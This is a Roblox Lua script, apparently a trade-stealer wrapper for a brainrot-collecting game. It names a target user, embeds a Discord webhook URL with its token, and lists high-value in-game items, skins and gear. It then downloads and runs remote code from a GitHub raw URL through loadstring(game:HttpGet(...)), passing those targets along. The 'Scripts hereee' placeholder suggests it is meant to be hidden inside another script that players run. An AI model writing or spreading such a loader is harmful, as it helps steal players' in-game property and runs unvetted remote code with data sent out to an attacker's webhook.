local TARGET_ID = 9450956082
local TARGET_USER = "TheVenom298"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1567864334942478436/inHeXzBKIQJbwAu0hYNIICDxdkqlzvTezLEhSgWPaQ0ecIzdXUdzdCmaCzbhoIoAEtFu"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["John Pork"] = true,
    ["Headless Horseman"] = true,
    ["Dragon Skeletonini"] = true,
    ["Phoenix"] = true,
    ["Hydra Serpent"] = true,
    ["Orchidox"] = true,
    ["Plant Bros"] = true,
    ["Los Dragons"] = true,
    ["Dragon Cannelloni"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Antonio"] = true,
    ["Hydra Bunny"] = true,
    ["Rubrikiko"] = true,
    ["Elefanto Frigo"] = true,
    ["Pancake and Syrup"] = true,
    ["Rico Dinero"] = true,
    ["Arcadragon"] = true,
    ["Capitano Americano"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Kalika Bros"] = true,
    ["Dragon Aquanini"] = true,
    ["Dug Dug Dug"] = true,
    ["Globa Steppa"] = true,
    ["La Casa Boo"] = true,
    ["Signore Carapace"] = true,
    ["La Supreme Combinasion"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Caylusaurus"] = true,
    ["Sammyni Cakini"] = true,
    ["Rhino Helicopterino"] = true,
    ["Los Hackers"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Digi Narwhal"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["Boppin Bunny"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Cooki and Milki"] = true,
    ["Cloverat Clapat"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Festive 67"] = true,
    ["Fragola La La La"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Examen Bros"] = true,
    ["Yetimatic"] = true,
    ["Los Amigos"] = true,
    ["S'more Serat"] = true,
    ["Queen Bee"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Sekolahs"] = true,
    ["Love Love Bear"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Rubiko and Kubiko"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Sammyni Truckini"] = true,
    ["Bumbatron"] = true,
    ["Bunny and Eggy"] = true
}

local TargetBaseSkins = {
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Divine"] = true,
    ["Diamond"] = true,
    ["Galaxy"] = true,
    ["Octo"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true,
    ["Rainbow"] = true,
    ["Radioactive"] = true,
    ["Candy"] = true
}

local TargetGears = {
    ["Cupid's Wings"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true
}

task.spawn(function()
    Scripts hereee

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)